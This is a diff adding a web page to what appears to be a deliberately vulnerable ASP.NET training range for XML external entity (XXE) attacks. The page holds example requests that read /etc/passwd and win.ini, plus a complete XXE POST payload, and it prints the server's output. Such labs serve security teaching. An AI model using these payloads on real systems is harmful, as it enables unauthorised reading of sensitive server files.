@@ -1,0 +1,32 @@
+
+@{
+    ViewBag.Title = "Xxe";
+
+}
+
+<h3>XXE靶场</h3>
+<ul>
+    <li>XmlDocument.XmlResolver</li>
+    <li>Linux请求地址:</li>
+    <span>:<a target="_blank" href="./xxe?id=file:///etc/passwd">./xxe?id=file:///etc/passwd</a></span>
+ 
+    <li>Windows请求地址:</li>
+    <span>:<a target="_blank" href="./xxe?id=file:///c:/windows/win.ini">./xxe?id=file:///c:/windows/win.ini</a></span>
+    <pre>
+        POST /vulns/xxe HTTP/1.1
+        Host: localhost:52730
+        Content-Type: application/xml
+        Content-Length: 130
+
+        &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+        &lt;!DOCTYPE cftea [
+        &lt;!ENTITY passwd SYSTEM "file:////etc/passwd"&gt;]&gt;
+        &lt;cftea&gt;&passwd;&lt;/cftea&gt;
+    </pre>
+</ul>
+
+<p>输出数据:</p>
+@if (ViewData["rs"] != null)
+{
+    <span>@ViewData["rs"]</span>
+}
